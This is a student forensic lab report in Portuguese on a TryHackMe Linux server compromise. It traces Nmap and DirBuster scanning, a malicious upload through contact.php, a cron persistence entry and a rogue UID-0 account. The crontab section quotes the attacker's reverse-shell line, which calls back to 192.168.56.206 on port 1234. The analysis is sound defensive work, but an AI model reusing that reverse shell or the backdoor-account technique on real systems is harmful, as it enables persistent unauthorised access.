Laboratório Avaliativo 1 - Auditoria de Logs e Forense em Servidores Linux

Unidade: Linux e Cibersegurança Ambiente: TryHackMe - Sala Linux Server Forensics (Tarefas 1 a 5)

Resumo
O servidor web da empresa ACME Web Design foi invadido por um atacante através do site. Ao analisar os registos de acesso do Apache, descobri que primeiro usaram ferramentas automáticas para explorar o servidor, depois enviaram um ficheiro malicioso pela página de contactos, criaram uma tarefa automática para manter o acesso aberto e, por fim, criaram uma conta falsa com poderes totais de administrador.

Provas
Parte 1: Reconhecimento (Tarefa 2)

1.1. Ferramentas usadas pelo atacante Comando usado: cut -d'"' -f6 /var/log/apache2/access.log | sort | uniq -c | sort -rn

Resultado do terminal: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html) DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)

O que isto significa: Ao olhar para os nomes dos programas que visitaram o site, encontrei duas ferramentas usadas por atacantes: o Nmap, que serve para procurar portas e falhas no servidor, e o DirBuster, que tenta adivinhar pastas e ficheiros escondidos.

1.2. De onde veio o ataque e o que o Nmap procurou Comandos usados: grep -a "Nmap" /var/log/apache2/access.log | cut -d' ' -f1,4 | head -3 grep -a "Nmap" /var/log/apache2/access.log | cut -d' ' -f7 | sort -u

Resultado do terminal: 192.168.56.24 [20/Apr/2021:09:53:46 /nmaplowercheck1618912425

O que isto significa: O ataque começou a partir do endereço IP 192.168.56.24 às 09:53:46 UTC. O Nmap tentou abrir páginas que não existem, como /nmaplowercheck1618912425, apenas para testar como o servidor respondia.

Parte 2: Ponto de Entrada (Tarefa 3)

2.1. Página de envio de ficheiros (POST) Comando usado: grep -a "POST" /var/log/apache2/access.log | cut -d' ' -f1,4,6,7,9

Resultado do terminal: 192.168.56.24 [20/Apr/2021:09:57:40 "POST /contact.php HTTP/1.1" 200

O que isto significa: Ao verificar o site e os registos de envio de dados, vi que a página de contactos (contact.php) deixava qualquer pessoa enviar ficheiros. Às 09:57:40 UTC, o IP 192.168.56.24 enviou um ficheiro malicioso por essa página e conseguiu entrar no servidor (código 200 significa que funcionou).

2.2. Pastas escondidas e aviso esquecido Comandos usados: grep -ai "dirbuster" /var/log/apache2/access.log | grep 200 | cut -d' ' -f7 | sort -u curl http://127.0.0.1/resources/development/2021/docs

Resultado do terminal: /resources/development/2021/docs

O que isto significa: A ferramenta DirBuster encontrou uma pasta de desenvolvimento que estava aberta ao público em /resources/development/2021/docs. Lá dentro havia um aviso escrito pelo Fred a alertar que a página de contactos tinha problemas de segurança que precisavam de ser corrigidos.

Parte 3: Persistência (Tarefa 4)

Comando usado: grep -v '^#' /etc/crontab

Resultado do terminal: SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

root2 sh -i >& /dev/tcp/192.168.56.206/1234 0>&1
O que isto significa: Para garantir que conseguia voltar a entrar no servidor sempre que quisesse, o atacante adicionou uma tarefa na última linha da agenda automática do sistema (/etc/crontab). Essa linha corre de minuto a minuto, usando a conta falsa root2, e abre uma linha de comandos (sh -i) que se liga sozinha ao computador do atacante no IP 192.168.56.206 na porta 1234.

Parte 4: Conta Suspeita (Tarefa 5)

Comando usado: awk -F: '$3==0' /etc/passwd

Resultado do terminal: root:x:0:0:root:/root:/bin/bash root2:***:0:0:root:/root:/bin/bash

O que isto significa: Ao ver a lista de utilizadores em /etc/passwd, encontrei uma segunda conta chamada root2 com o número de identificação 0 (UID 0), o que lhe dá exatamente os mesmos poderes totais que o administrador principal (root). Além disso, a senha encriptada estava guardada diretamente neste ficheiro que todos podem ler, em vez de estar protegida no ficheiro /etc/shadow. O código da senha foi tapado com asteriscos por segurança.

Linha Temporal
Hora (UTC): 09:53:46 IP: 192.168.56.24 O que aconteceu: O atacante começou a testar o site com o programa Nmap e tentou abrir a página /nmaplowercheck1618912425. Prova: Ficheiro /var/log/apache2/access.log usando grep -a "Nmap" access.log

Hora (UTC): Entre 09:53:46 e 09:57:40 IP: 192.168.56.24 O que aconteceu: O atacante usou o DirBuster para procurar pastas escondidas e encontrou a pasta /resources/development/2021/docs com o aviso do Fred. Prova: Ficheiro /var/log/apache2/access.log usando grep -ai "dirbuster" access.log

Hora (UTC): 09:57:40 IP: 192.168.56.24 O que aconteceu: O atacante enviou um ficheiro malicioso pela página de contactos (contact.php) e conseguiu entrar. Prova: Ficheiro /var/log/apache2/access.log usando grep -a "POST" access.log

Hora (UTC): Depois da invasão IP: 192.168.56.206 O que aconteceu: Foi criada uma tarefa automática no cron que liga o servidor ao IP do atacante na porta 1234 a cada minuto. Prova: Ficheiro /etc/crontab usando grep -v '^#' /etc/crontab

Hora (UTC): Depois da invasão IP: Local O que aconteceu: Foi criada a conta falsa root2 com poderes totais de administrador (UID 0). Prova: Ficheiro /etc/passwd usando awk -F: '$3==0' /etc/passwd

Recomendações

Bloquear envios perigosos na página de contactos: Configurar a página contact.php para aceitar apenas ficheiros seguros (como imagens ou PDFs) e impedir que ficheiros de código sejam executados no servidor.

Limpar os acessos do atacante: Apagar imediatamente a conta falsa root2 do ficheiro /etc/passwd e remover a linha do atacante no ficheiro /etc/crontab para cortar a ligação remota.

Apagar pastas de testes: Remover a pasta /resources/development/2021/docs do site público para que ninguém de fora consiga ver avisos ou ficheiros internos da empresa.
